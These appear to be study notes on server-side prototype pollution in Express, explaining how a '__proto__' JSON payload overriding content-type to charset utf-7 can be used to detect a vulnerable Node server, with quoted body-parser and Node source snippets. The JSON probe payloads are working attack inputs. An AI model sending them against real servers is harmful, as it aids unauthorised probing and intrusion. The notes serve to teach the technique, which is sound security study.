## Charset override

Express servers have “middleware” to process requests before giving to the correct handler. `body-parser` on requests to generate `req.body`. This contains another gadet for prototype pollution.

The following code, passes object into the `read()` function, used to read in request body to parse. There is encoding, gets `getCharset(req)` or defaults `UTF-8`. 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
var charset = getCharset(req) or 'utf-8'
function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}
read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### Example:

If can find an object with properties visible in responses, can use it to probe for sources. Ex. using `UTF-7` and JSON source:

1. Add arbitrary `UTF-7` string foo in `UTF-7` is +AGYAbwBv-.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
2. Send request, servers won't use `UTF-7` by default, so the strings should appear in the encoded form.

3. Pollute with a content-type to specify `UTF-7`
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
4. Repeat the request and the response should contain the decoded `UTF-7` string.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
There is a bug on Node's `_http_incoming` module, even if `Conten-Type` header includes the charset.

`_addHeaderLine()` checks that no property already exists before trasnfering properties to an `IncomingMessage` object.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // Drop duplicates
        dest[field] = value;
    }
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
It includes properties inherited from prototype chain, then can pollute prototype with the content-type property.
